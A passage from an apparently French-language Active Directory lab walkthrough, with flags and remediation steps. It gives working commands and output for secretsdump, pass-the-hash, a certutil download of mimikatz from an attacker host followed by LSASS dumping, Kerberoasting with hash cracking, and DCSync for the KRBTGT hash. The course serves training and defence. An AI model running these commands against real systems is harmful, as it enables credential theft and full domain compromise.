# Extraction avec hash au lieu de mot de passe en clair
# -hashes :<NTLM_HASH> permet de s'authentifier avec le hash NTLM
# (technique Pass-the-Hash intégrée à secretsdump)
# : avant le hash = LM hash vide (désactivé)
impacket-secretsdump \
    -hashes :<NTLM_HASH> \
    CORPSHADOW/jdoe@10.10.10.20
```

**Explication des variantes :**

| Option | Rôle/Explication |
|--------|------------------|
| `-sam` | Limite l'extraction à la base SAM (comptes locaux uniquement) ; évite le bruit des données LSA |
| `-hashes :<NTLM_HASH>` | Authentification par hash NTLM (Pass-the-Hash) ; le `:` avant le hash indique un LM hash vide (format standard) |

#### 5.3.4 Exécution

```bash
# Lancer le dump complet des hashes sur FS01 (10.10.10.20)
# secretsdump se connecte via le partage ADMIN$ (SMB) pour accéder au registre distant
# Il extrait les ruches SAM, SYSTEM et SECURITY, puis les déchiffre localement
impacket-secretsdump \
    CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-secretsdump CORPSHADOW/jdoe:'P@ssw0rd!2025'@10.10.10.20` | Extrait les hashes de FS01 via SMB en utilisant les identifiants de `jdoe` |

```text
Output attendu (extrait) — Analyse détaillée :

Impacket v0.12.0 - Copyright 2022 Fortra
[*] Target system IP: 10.10.10.20           → Cible = FS01
[*] Scanning service 445 (SMB)              → Connexion au port SMB
[*] Service SAM            : connecté       → Accès à la ruche SAM réussi
[*] Service SYSTEM         : connecté       → Accès à la ruche SYSTEM (clé de déchiffrement)
[*] Service SECURITY       : connecté       → Accès à la ruche SECURITY (cache domaine)
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    → Format : nom: RID:LM_HASH:NT_HASH:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    → RID 500 = compte Administrateur intégré (toujours)
    → LM hash = aad3b435b51404eeaad3b435b51404ee (vide = LM désactivé)
    → NT hash = 31d6cfe0d16ae931b73c59d7e0c089c0 (hash du mot de passe vide = compte désactivé)
Guest:501:...                               → RID 501 = compte Invité (désactivé)
DefaultAccount:503:...                      → RID 503 = compte par défaut
jdoe:1001:...:<NTLM_HASH_JDOE>:::           → RID 1001+ = comptes locaux créés manuellement

[*] Dumping cached domain logon info        → Cache des connexions domaine
    → Contient les hashes des utilisateurs du domaine qui se sont connectés à FS01

[*] Dumping LSA secrets                      → Secrets LSA (mots de passe stockés)
$MACHINE.ACC: ...:<MACHINE_HASH>            → Hash du compte machine (nom d'ordinateur)
corp.shadow.local\Administrator: <NTLM_ADMIN_HASH>  → Hash de l'admin du domaine (en cache)
```

#### 5.3.5 Flag attendu

```text
FLAG{Module10_secretsdump_i9j0k1l2}
```

#### 5.3.6 Analyse post-exercice — Remédiation

```powershell
# Activer la protection LSA (Windows Defender Credential Guard)
# Credential Guard isole la partie sensible de LSASS dans un conteneur virtualisé
# Même avec un accès administrateur, l'attaquant ne peut pas extraire les hashes
# de la mémoire LSASS (protection matérielle via virtualisation)

# Via le registre :
# New-Item crée une nouvelle clé de registre (LsaCfgFlags sous Lsa)
# -Force : crée la clé si elle n'existe pas, sans erreur
New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name "LsaCfgFlags" -Force

# Set-ItemProperty définit la valeur de la clé LsaCfgFlags
# Valeur 1 = Credential Guard activé avec verrouillage UEFI (recommandé)
Set-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" `
    -Name "LsaCfgFlags" `
    -Value 1

# Restreindre l'accès distant au registre Windows
# SecurePipeServers\winreg contrôle les accès au registre via le réseau
# RemoteRegAccess = 1 limite l'accès aux administrateurs authentifiés
Set-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg" `
    -Name "RemoteRegAccess" `
    -Value 1

# Désactiver le stockage des mots de passe en texte clair via WDigest
# WDigest est un fournisseur d'authentification qui stocke les mots de passe
# en clair en mémoire pour les versions anciennes de Windows
# UseLogonCredential = 0 désactive ce comportement dangereux
Set-ItemProperty `
    -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    -Name "UseLogonCredential" `
    -Value 0
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `New-Item -Path HKLM:\... -Name "LsaCfgFlags" -Force` | Crée la clé de registre `LsaCfgFlags` sous `Control\Lsa` ; `-Force` = écraser si existant |
| `Set-ItemProperty ... -Name "LsaCfgFlags" -Value 1` | Active Credential Guard ; 1 = avec UEFI lock (nécessite redémarrage) |
| `HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg` | Clé registre contrôlant l'accès distant au registre |
| `RemoteRegAccess = 1` | Restreint l'accès distant au registre aux seuls administrateurs |
| `HKLM:\...\SecurityProviders\WDigest` | Clé registre du fournisseur d'authentification WDigest (obsolète, dangereux) |
| `UseLogonCredential = 0` | Empêche WDigest de stocker le mot de passe en clair en mémoire |

---

### 5.4 — Flag 4 : Pass-the-Hash vers une machine distante

#### 5.4.1 Technique et ATT&CK

| Propriété | Valeur |
|-----------|--------|
| **Technique** | Use Alternate Authentication Material |
| **Sous-technique** | T1550.002 — Pass-the-Hash |
| **Tactique** | TA0008 — Lateral Movement |
| **Outil** | `impacket-wmiexec`, `impacket-psexec`, `impacket-smbexec` |
| **Prérequis** | Hash NTLM d'un compte admin local (flag 3) ; SMB ouvert sur cible |

#### 5.4.2 Explication détaillée

Le **Pass-the-Hash (PtH)** est une technique qui permet de s'authentifier sur une machine distante en utilisant le **hash NTLM** d'un mot de passe plutôt que le mot de passe en clair. Cette technique exploite le fonctionnement du protocole NTLM :

1. Lors de l'authentification NTLM, le client envoie une **preuve de connaissance du mot de passe** sous forme d'un hash (response) calculé à partir d'un challenge
2. Le serveur vérifie cette preuve en comparant avec le hash stocké dans sa base SAM
3. Si le hash est correct, l'authentification réussit — le serveur n'a **jamais besoin** du mot de passe en clair

**Conséquence :** Si l'on possède le hash NTLM d'un utilisateur, on peut s'authentifier sans connaître son mot de passe. C'est particulièrement dangereux car :
- Le hash peut être extrait via secretsdump (Flag 3)
- Le hash est souvent réutilisé entre machines (surtout si LAPS n'est pas déployé)
- L'administrateur local a souvent le même mot de passe sur toutes les machines

> **Pourquoi ça marche ?**  
> Dans le scénario CorpShadow, l'administrateur local est identique sur WS01 et FS01 (même hash). En extrayant le hash de l'administrateur local de WS01 (via secretsdump sur FS01 contenant les hashes en cache), on peut se connecter à FS01 en tant qu'administrateur.

#### 5.4.3 Commande

```bash
# Syntaxe avec wmiexec (recommandé — le plus furtif)
# wmiexec utilise WMI (Windows Management Instrumentation) via RPC (port 135)
# pour exécuter des commandes à distance, sans créer de service ou fichier sur le disque
# C'est la méthode la plus discrète pour le mouvement latéral
impacket-wmiexec \
    -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> \
    CORPSHADOW/jdoe@10.10.10.20
```

**Explication des options :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-wmiexec` | Outil Impacket d'exécution de commandes à distance via WMI (ports 135/RPC + 445/SMB) |
| `-hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>` | Authentification par hash NTLM : `LM_HASH:NT_HASH` ; le LM hash `aad3b435b51404eeaad3b435b51404ee` est la valeur pour "hash vide" (LM désactivé) |
| `CORPSHADOW/jdoe@10.10.10.20` | Compte de domaine `jdoe` visant la machine `10.10.10.20` (FS01) |

```bash
# Variante avec psexec (plus bruyant — crée un service Windows)
# psexec copie un fichier sur ADMIN$ et crée un service Windows pour l'exécution
# Génère des événements 7045 (création de service) et 4688 (création de processus)
impacket-psexec \
    -hashes :<NTLM_HASH> \
    CORPSHADOW/jdoe@10.10.10.20

# Variante avec smbexec (également via SMB mais plus furtif que psexec)
# smbexec utilise SVCCTL (Service Control Manager) via SMB pour créer un service
# temporaire, mais sans copier de fichier sur le disque (exécution en mémoire via BITS)
impacket-smbexec \
    -hashes :<NTLM_HASH> \
    CORPSHADOW/jdoe@10.10.10.20
```

**Explication des variantes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-psexec -hashes :<NTLM_HASH> ...` | Version Impacket de PsExec : copie un binaire sur ADMIN$ + crée un service (bruyant, facile à détecter) |
| `impacket-smbexec -hashes :<NTLM_HASH> ...` | Exécution via SVCCTL sans copie de fichier (plus furtif que psexec) |
| `:<NTLM_HASH>` | Format court du hash : le LM hash vide est sous-entendu (équivalent à `aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>`) |

#### 5.4.4 Exécution

```bash
# Étape 1 : Récupérer le hash NTLM de l'administrateur local depuis le flag 3
# Dans l'output de secretsdump, chercher la ligne contenant RID 500 :
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_ADMIN_HASH>:::
# RID 500 = Administrateur intégré (toujours le même RID sur toutes les machines Windows)
# Ce hash est potentiellement identique sur WS01 et FS01 (pas de LAPS)

# Étape 2 : Pass-the-Hash avec wmiexec vers FS01
# On utilise le hash NTLM de l'administrateur (31d6cfe0d16ae931b73c59d7e0c089c0 dans cet exemple)
# Le LM hash vide (aad3b435b51404eeaad3b435b51404ee) indique que LM est désactivé
# wmiexec ouvre un shell semi-interactif sur la machine distante via WMI
impacket-wmiexec \
    -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 \
    CORPSHADOW/jdoe@10.10.10.20

# Étape 3 : Une fois le shell obtenu, naviguer dans le système
# whoami   → Affiche le nom de l'utilisateur courant (vérifier les privilèges)
# hostname → Affiche le nom de la machine (confirmer qu'on est sur FS01)
# type     → Équivalent Windows de cat : affiche le contenu d'un fichier texte
# On lit le flag 4 stocké dans C:\Flags\flag4.txt
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0... ...` | Obtient un shell sur FS01 via WMI en utilisant le hash NTLM de l'administrateur (Pass-the-Hash) |
| `aad3b435b51404eeaad3b435b51404ee` | LM hash vide (valeur spéciale indiquant que l'authentification LM est désactivée) |
| `31d6cfe0d16ae931b73c59d7e0c089c0` | NT hash NTLM (hash du mot de passe administrateur local) |
| `whoami` | Commande Windows : affiche le nom de l'utilisateur courant |
| `hostname` | Commande Windows : affiche le nom de la machine |
| `type C:\Flags\flag4.txt` | Commande Windows : affiche le contenu du fichier texte (équivalent de `cat`) |

**Comparaison des méthodes de mouvement latéral :**

| Outil | Port | Mécanisme | Détection | Furtivité |
|-------|------|-----------|-----------|-----------|
| `wmiexec` | 135/RPC + 445/SMB | WMI (Win32_Process.Create) | Événement 4688 (création processus) | ★★★ |
| `psexec` | 445/SMB | Service Windows créé | Événement 7045 (nouveau service) | ★★☆ |
| `smbexec` | 445/SMB | Service via SVCCTL | Événement 7045 (nouveau service) | ★★☆ |

#### 5.4.5 Alternative : Pass-the-Hash avec mimikatz (sur le poste Windows)

```powershell
# Si vous avez un shell sur WS01, utiliser mimikatz directement sur le poste Windows
# Mimikatz est un outil de post-exploitation qui interagit avec LSASS en mémoire

# Étape 1 : Télécharger mimikatz.exe depuis le serveur d'attaque Kali
# certutil est un utilitaire Windows de gestion de certificats
# -urlcache : télécharge un fichier depuis une URL (détournement de fonction)
# -f : force le téléchargement (écrase le fichier existant)
# === SUR KALI (terminal séparé) : servir le binaire ===
# python3 -m http.server 8080 --directory /tmp/tools/ &
# === SUR WINDOWS : télécharger ===
# http://10.10.10.200/mimikatz.exe → fichier hébergé sur le serveur Kali de l'attaquant
certutil -urlcache -f http://10.10.10.200/mimikatz.exe mimikatz.exe

# Étape 2 : Dumper les hashes depuis la mémoire LSASS (nécessite admin local)
# "privilege::debug" : obtient le privilège SeDebugPrivilege (nécessaire pour accéder à LSASS)
# "sekurlsa::logonpasswords" : extrait les mots de passe et hashes de la mémoire LSASS
# "exit" : quitte mimikatz
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Étape 3 : Pass-the-Hash avec mimikatz
# "sekurlsa::pth" : Pass-the-Hash (injecte le hash dans une session d'authentification)
# /user:Administrator : compte cible
# /domain:corp.shadow.local : domaine du compte
# /ntlm:<NTLM_HASH> : hash NTLM à utiliser pour l'authentification
# /run:powershell.exe : programme à lancer avec la session authentifiée
.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:corp.shadow.local /ntlm:<NTLM_HASH> /run:powershell.exe" "exit"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `certutil -urlcache -f http://... mimikatz.exe` | Télécharge mimikatz.exe depuis Kali ; `-urlcache` = fonction de cache HTTP de certutil (détournée pour téléchargement) ; `-f` = forcer le téléchargement |
| `.\mimikatz.exe "privilege::debug"` | Demande le privilège `SeDebugPrivilege` (nécessaire pour lire la mémoire d'autres processus comme LSASS) |
| `"sekurlsa::logonpasswords"` | Module sekurlsa de mimikatz : extrait tous les mots de passe et hashes présents dans LSASS |
| `"sekurlsa::pth /user:... /domain:... /ntlm:... /run:powershell.exe"` | **Pass-the-Hash** : crée une session d'authentification avec le hash NTLM fourni et lance `powershell.exe` avec cette identité |
| `/ntlm:<NTLM_HASH>` | Hash NTLM à injecter dans l'authentification |
| `/run:powershell.exe` | Programme à exécuter après l'injection du hash (on obtient un shell PowerShell avec les droits du compte cible) |

#### 5.4.6 Flag attendu

```text
FLAG{Module10_pth_m3n4o5p6}
```

#### 5.4.7 Analyse post-exercice — Remédiation

```powershell
# Déployer LAPS (Local Administrator Password Solution)
# LAPS est une solution Microsoft qui gère des mots de passe administrateur local
# UNIQUES pour chaque machine du domaine, changés régulièrement et stockés
# dans Active Directory (attribut ms-Mcs-AdmPwd)
# Ainsi, même si un attaquant compromet une machine, le hash admin local
# n'est pas réutilisable sur les autres machines

# 1. Installer LAPS sur le domaine (téléchargement préalable requis)
# L'installateur modifie le schéma AD et ajoute les outils d'administration

# 2. Étendre le schéma AD pour ajouter les attributs LAPS
# Import-Module AdmPwd.PS : charge le module PowerShell LAPS
# Update-AdmPwdADSchema : étend le schéma AD avec les classes et attributs LAPS
Import-Module AdmPwd.PS
Update-AdmPwdADSchema

# 3. Déléguer les droits aux ordinateurs pour qu'ils puissent écrire leur mot de passe
# Set-AdmPwdComputerSelfPermission : permet aux ordinateurs d'une OU donnée
# de mettre à jour leur propre attribut ms-Mcs-AdmPwd dans AD
Set-AdmPwdComputerSelfPermission -OrgUnit "OU=Workstations,DC=corp,DC=shadow,DC=local"

# Vérifier le déploiement sur une machine :
# Get-ItemProperty lit la valeur registre confirmant que la GPO LAPS est appliquée
Get-ItemProperty "HKLM:\Software\Policies\Microsoft Services\AdmPwd"
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `Import-Module AdmPwd.PS` | Charge le module PowerShell LAPS (AdmPwd = Administrator Password) pour la gestion des mots de passe administrateur local |
| `Update-AdmPwdADSchema` | Étend le schéma AD avec les nouveaux attributs LAPS (ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime) |
| `Set-AdmPwdComputerSelfPermission -OrgUnit "OU=..."` | Délègue aux ordinateurs de l'OU le droit d'écrire leur propre mot de passe LAPS dans AD |
| `Get-ItemProperty "HKLM:\...\AdmPwd"` | Vérifie que la GPO LAPS est bien appliquée sur la machine locale |

---

### 5.5 — Flag 5 : Kerberoasting d'un compte de service

#### 5.5.1 Technique et ATT&CK

| Propriété | Valeur |
|-----------|--------|
| **Technique** | Steal or Forge Kerberos Tickets |
| **Sous-technique** | T1558.003 — Kerberoasting |
| **Tactique** | TA0006 — Credential Access |
| **Outil** | `impacket-GetUserSPNs` |
| **Prérequis** | Compte de domaine valide (`jdoe`) ; un compte avec SPN et mot de passe faible |

#### 5.5.2 Explication détaillée

**Kerberoasting** est une technique d'attaque qui cible les **comptes de service Active Directory** possédant un **SPN (Service Principal Name)**.

**Fonctionnement de Kerberos (rappel simplifié) :**

```
1. Le client demande un TGT (Ticket-Granting Ticket) au KDC (DC)
   → Authentification avec le hash du mot de passe du client
2. Le client demande un TGS (Ticket-Granting Service) pour un service spécifique
   → Fournit le SPN du service cible
3. Le KDC génère un TGS chiffré avec le HASH du MOT DE PASSE du compte de service
4. Le TGS est renvoyé au client
5. Le client présente le TGS au service

→ ÉTAPE CLÉ : Le TGS (étape 3) est chiffré avec le hash du service
→ L'attaquant peut tenter de casser ce TGS hors ligne (offline)
```

**Attaque Kerberoasting :**

1. L'attaquant (avec un compte valide) demande un **TGS** pour un SPN spécifique
2. Le DC renvoie le TGS chiffré avec le hash du mot de passe du compte de service
3. L'attaquant sauvegarde le TGS et tente de le **casser hors ligne**
4. Si le mot de passe est faible, il est retrouvé en clair

> **Pourquoi ça marche ?**  
> Les comptes de service ont souvent des mots de passe longs mais **faibles** (faciles à retenir). De plus, ils sont rarement changés (contrainte opérationnelle). Le TGS est chiffré avec RC4_HMAC (utilisant le hash NTLM), ce qui le rend cassable avec hashcat ou john.

#### 5.5.3 Commande

```bash
# Étape 1 : Lister les SPNs (Service Principal Names) du domaine
# impacket-GetUserSPNs interroge le contrôleur de domaine via LDAP pour trouver
# tous les comptes utilisateur possédant un SPN (Service Principal Name)
# Un SPN est l'identifiant unique d'un service dans Kerberos (ex: FS01/corp.shadow.local)
# Les comptes avec SPN sont potentiellement kerberoastables
impacket-GetUserSPNs \
    CORPSHADOW/jdoe:'P@ssw0rd!2025' \
    -dc-ip 10.10.10.10
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-GetUserSPNs` | Outil Impacket qui liste les comptes utilisateur avec SPN (Service Principal Name) via LDAP |
| `CORPSHADOW/jdoe:'P@ssw0rd!2025'` | Authentification avec le compte de domaine `jdoe` (compte standard, pas besoin d'admin) |
| `-dc-ip 10.10.10.10` | **Domain Controller IP** : adresse IP du contrôleur de domaine (DC01) pour la requête LDAP/Kerberos |

```bash
# Étape 2 : Demander et exporter les tickets TGS (Ticket-Granting Service)
# -request : demande au KDC (Key Distribution Center) de délivrer un TGS
#           pour chaque SPN trouvé. Le TGS est chiffré avec le hash du mot de passe
#           du compte de service cible.
# -outputfile : sauvegarde les tickets TGS dans un fichier pour crack ultérieur
impacket-GetUserSPNs \
    CORPSHADOW/jdoe:'P@ssw0rd!2025' \
    -dc-ip 10.10.10.10 \
    -request \
    -outputfile /tmp/kerberoast_tgs.txt
```

**Explication des options supplémentaires :**

| Option | Rôle/Explication |
|--------|------------------|
| `-request` | Demande un TGS pour chaque SPN trouvé ; le TGS est chiffré avec le hash NTLM du compte de service (c'est ce ticket qu'on va cracker) |
| `-outputfile /tmp/kerberoast_tgs.txt` | Sauvegarde les tickets TGS dans le fichier spécifié pour l'attaque hors ligne |
| `-target-domain` | Option facultative pour cibler un domaine de confiance différent (inter-domaine) |

#### 5.5.4 Exécution

```bash
# Étape 1 : Lister les SPNs du domaine
# La commande interroge le DC et affiche tous les comptes avec SPN
impacket-GetUserSPNs \
    CORPSHADOW/jdoe:'P@ssw0rd!2025' \
    -dc-ip 10.10.10.10
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-GetUserSPNs CORPSHADOW/jdoe:'P@ssw0rd!2025' -dc-ip 10.10.10.10` | Liste les SPN du domaine ; les colonnes affichées sont : SPN, nom du compte, groupe, date du dernier changement de mot de passe |

```text
Output attendu :
ServicePrincipalName              Name          MemberOf  PasswordLastSet      Email
-------------------------------  ------------  --------  ------------------  -----
FS01/corp.shadow.local            svc_backup              2024-12-01 10:00:00
DC01/sql.corp.shadow.local        svc_sql                 2024-11-15 14:30:00
→ Deux comptes kerberoastables : svc_backup (sur FS01) et svc_sql (sur DC01)
→ PasswordLastSet ancien → mot de passe probablement non changé depuis longtemps
```

```bash
# Étape 2 : Demander le TGS pour les SPNs trouvés
# Le KDC (DC01) délivre un TGS chiffré avec le hash NTLM du compte de service
# Le ticket est stocké dans /tmp/kerberoast_tgs.txt pour crack
impacket-GetUserSPNs \
    CORPSHADOW/jdoe:'P@ssw0rd!2025' \
    -dc-ip 10.10.10.10 \
    -request \
    -outputfile /tmp/kerberoast_tgs.txt
```

```text
Output attendu :
[*] Requesting tickets for SPNs...           → Demande de TGS en cours
[*] Saving TGS in /tmp/kerberoast_tgs.txt    → Ticket sauvegardé
$krb5tgs$23$*svc_backup$CORP.SHADOW.LOCAL... → Ticket TGS au format hashcat/john
  → $krb5tgs$23$ = en-tête du hash (Kerberos 5 TGS, etype 23 = RC4-HMAC)
  → svc_backup = nom du compte de service
  → CORP.SHADOW.LOCAL = domaine en majuscules
```

```bash
# Étape 3 : Analyser le fichier de ticket
# cat affiche le contenu du fichier (le hash du TGS à cracker)
cat /tmp/kerberoast_tgs.txt
```

**Cracker le TGS avec john :**

```bash
# Méthode 1 : Avec john the ripper et la wordlist rockyou
# john essaie chaque mot du dictionnaire comme mot de passe
# pour déchiffrer le TGS. Si le TGS se déchiffre avec un mot,
# c'est que ce mot est le mot de passe du compte de service.
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/kerberoast_tgs.txt

# Méthode 2 : Avec hashcat (beaucoup plus rapide si GPU disponible)
# -m 13100 : mode hash = Kerberos 5 TGS-REP (etype 23 = RC4-HMAC)
# --force : ignorer les avertissements de compatibilité OpenCL
hashcat -m 13100 /tmp/kerberoast_tgs.txt /usr/share/wordlists/rockyou.txt --force

# Étape 4 : Afficher le mot de passe cracké
# john --show liste tous les mots de passe crackés dans le fichier
john --show /tmp/kerberoast_tgs.txt
# Output attendu :
# svc_backup:SvcB@ckup#2025
# → Mot de passe du compte de service svc_backup = SvcB@ckup#2025
```

**Cracker le TGS avec un script dédié (tgsrepcrack) :**

```bash
# Alternative : tgsrepcrack.py fait partie du toolkit kerberoast
# Il prend en entrée la wordlist et le fichier de tickets TGS
# Avantage : permet de cracker spécifiquement les tickets Kerberos
python3 /opt/kerberoast/tgsrepcrack.py \
    /usr/share/wordlists/rockyou.txt \
    /tmp/kerberoast_tgs.txt
```

**Explication des commandes de crack :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/kerberoast_tgs.txt` | **John the Ripper** : craque le TGS par dictionnaire ; `rockyou.txt` contient les mots de passe les plus courants |
| `hashcat -m 13100 ... --force` | **Hashcat** : craque par GPU ; `-m 13100` = mode Kerberos 5 TGS-REP (etype 23, RC4-HMAC) ; `--force` = ignorer les avertissements |
| `python3 /opt/kerberoast/tgsrepcrack.py rockyou.txt tgs.txt` | Script spécialisé du toolkit kerberoast pour cracker les TGS |
| `john --show /tmp/kerberoast_tgs.txt` | Affiche le résultat du crack : utilisateur:mot_de_passe |

#### 5.5.5 Flag attendu

```text
FLAG{Module10_kerberoast_q7r8s9t0}
```

#### 5.5.6 Analyse post-exercice — Remédiation

```powershell
# 1. Utiliser des comptes gMSA (Group Managed Service Account)
# Les gMSA sont des comptes de service dont le mot de passe est géré automatiquement
# par le contrôleur de domaine (changé régulièrement, 30 caractères aléatoires)
# Ils éliminent le besoin de stocker et gérer manuellement des mots de passe

# Créer un nouveau compte gMSA
# New-ADServiceAccount crée un compte de service géré dans AD
# -Name : nom du compte (sans le $
# -DNSHostName : nom DNS du serveur hôte
# -Enabled $true : active le compte
# -ServicePrincipalNames : SPN associé au compte
New-ADServiceAccount `
    -Name "gmsa_backup" `
    -DNSHostName "FS01.corp.shadow.local" `
    -Enabled $true `
    -ServicePrincipalNames "FS01/corp.shadow.local"

# Installer le gMSA sur le serveur cible (FS01)
# Install-ADServiceAccount installe le compte sur la machine locale
# pour qu'il puisse être utilisé par les services
Install-ADServiceAccount -Identity "gmsa_backup"

# 2. Pour les comptes de service classiques non gMSA :
# Désactiver l'option "PasswordNeverExpires" pour forcer les changements réguliers
# Set-ADUser modifie les propriétés d'un utilisateur AD
# -PasswordNeverExpires $false : le mot de passe doit expirer (rotation obligatoire)
Set-ADUser -Identity svc_backup -PasswordNeverExpires $false

# 3. Activer l'audit Kerberos avancé pour détecter les attaques Kerberoasting
# auditpol configure les politiques d'audit Windows
# /set : définit une politique
# /subcategory:"Kerberos Service Ticket Operations" : catégorie des tickets Kerberos
# /success:enable : audite les succès (toute demande de TGS sera loggée)
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable

# 4. Vérifier et configurer les types de chiffrement supportés par le compte de service
# Get-ADUser lit les propriétés de l'utilisateur AD
# -Properties msDS-SupportedEncryptionTypes : type de chiffrement Kerberos
Get-ADUser -Identity svc_backup -Properties msDS-SupportedEncryptionTypes

# Forcer l'utilisation d'AES256 plutôt que RC4 (vulnérable au Kerberoasting)
# Set-ADUser -Replace remplace la valeur de l'attribut
# "msDS-SupportedEncryptionTypes" = 24 signifie AES128 + AES256 activés
# Cela rend le Kerberoasting beaucoup plus difficile (casser AES256 est
# exponentiellement plus coûteux que RC4)
Set-ADUser -Identity svc_backup -Replace @{
    "msDS-SupportedEncryptionTypes" = 24
}
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `New-ADServiceAccount -Name "gmsa_backup" -DNSHostName "FS01..." -Enabled $true -SPN "..."` | Crée un compte de service géré (gMSA) avec mot de passe automatique |
| `Install-ADServiceAccount -Identity "gmsa_backup"` | Installe le gMSA sur le serveur local pour utilisation par les services Windows |
| `Set-ADUser -Identity svc_backup -PasswordNeverExpires $false` | Force l'expiration du mot de passe du compte de service (rotation obligatoire) |
| `auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable` | Active l'audit des demandes de TGS Kerberos (événement 4769) pour détecter le Kerberoasting |
| `Get-ADUser ... msDS-SupportedEncryptionTypes` | Lit les types de chiffrement supportés par le compte (DES, RC4, AES128, AES256) |
| `Set-ADUser -Replace @{"msDS-SupportedEncryptionTypes" = 24}` | Configure AES128 + AES256 seulement (désactive RC4 = empêche le Kerberoasting efficace) |

---

### 5.6 — Flag 6 (Bonus) : DCSync → Golden Ticket → Accès persistant

#### 5.6.1 Technique et ATT&CK

| Propriété | Valeur |
|-----------|--------|
| **Technique** | DCSync (Domain Controller Synchronization) |
| **Sous-technique** | T1003.006 — DCSync |
| **Tactique** | TA0006 — Credential Access |
| **Outil** | `impacket-secretsdump -just-dc` + `impacket-ticketer` |
| **Prérequis** | Compte avec droits de réplication (Admin domaine ou équivalent) |

#### 5.6.2 Explication détaillée

**DCSync** est une technique qui simule le comportement d'un contrôleur de domaine secondaire pour demander la réplication des données d'annuaire. Active Directory utilise le protocole **DRS (Directory Replication Service)** via MS-DRSR ([MS-DRSR] Directory Replication Service) pour synchroniser les bases de données entre DCs.

**Fonctionnement :**

1. Un contrôleur de domaine secondaire (RODC ou RWDC) demande la réplication au DC principal
2. Le protocole DRS utilise des opérations **GetNCChanges** pour répliquer les objets
3. En demandant des attributs spécifiques (notamment `unicodePwd` et `supplementalCredentials`), on peut récupérer les hashes NTLM de **tous les comptes du domaine**, y compris le KRBTGT

**Pour DCSync, les droits requis sont :**

- `Replicating Directory Changes` (DS-Replication-Get-Changes)
- `Replicating Directory Changes All` (DS-Replication-Get-Changes-All)

Ces droits sont généralement détenus par les groupes **Administrateurs du domaine**, **Contrôleurs de domaine** et **Admins d'entreprise**.

**Golden Ticket :**

Une fois le hash du compte **KRBTGT** récupéré via DCSync, on peut forger un **Golden Ticket** :

1. Le KRBTGT est le compte qui chiffre TOUS les TGT du domaine
2. Avec son hash, on peut créer un TGT pour N'IMPORTE QUEL utilisateur
3. Le TGT peut avoir une durée de vie arbitraire (10 ans par exemple)
4. Ce ticket permet un accès persistant même après changement de mot de passe des autres comptes

> **Pourquoi ça marche ?**  
> Le protocole DRS est légitime et nécessaire au fonctionnement d'Active Directory. Il est difficile de le bloquer sans casser la réplication. La seule protection efficace est de restreindre les droits de réplication aux seuls comptes autorisés (ce qui est normalement le cas — un compte utilisateur standard ne peut pas DCSync).

#### 5.6.3 Commande DCSync

```bash
# Étape 1 : DCSync — extraire tous les hashes du domaine
# impacket-secretsdump avec -just-dc utilise le protocole DRSUAPI (Directory Replication Service)
# pour simuler la réplication entre contrôleurs de domaine
# Il demande les attributs unicodePwd et supplementalCredentials de tous les objets
# du domaine, ce qui permet de récupérer les hash NTLM de TOUS les comptes
# Condition : le compte utilisé doit avoir les droits de réplication DS
# (Administrator du domaine possède ces droits par défaut)
impacket-secretsdump \
    CORPSHADOW/Administrator@10.10.10.10 \
    -just-dc
```

**Explication des commandes :**

| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `impacket-secretsdump` | Extrait les hashes via SMB (SAM distant) ou DRSUAPI (DCSync) |
| `CORPSHADOW/Administrator@10.10.10.10` | Compte administrateur du domaine visant le contrôleur de domaine (DC01) |
| `-just-dc` | Mode DCSync : utilise DRSUAPI pour répliquer NTDS.dit (la base AD) et extraire tous les hashes du domaine |

**Variantes :**

```bash
# Extraire uniquement le hash du compte KRBTGT (nécessaire pour le Golden Ticket)
# grep filtre la sortie pour ne garder que la ligne contenant "krbtgt"
# Le KRBTGT est le compte utilisé par le KDC pour chiffrer TOUS les TGT du domaine
impacket-secretsdump \
    CORPSHADOW/Administrator@10.10.10.10 \
    -just-dc \
    | grep krbtgt

# Extraire le hash d'un utilisateur spécifique uniquement
# -just-dc-user : limite l'extraction à un seul utilisateur (plus rapide, moins de bruit)
impacket-secretsdump \
    CORPSHADOW/Administrator@10.10.10.10 \
    -just-dc-user jdoe

# Utiliser Pass-the-Hash pour DCSync
# Si on a le hash NTLM de l'admin mais pas son mot de passe,
# on utilise -hashes :<NTLM_ADMIN_HASH> pour s'authentifier
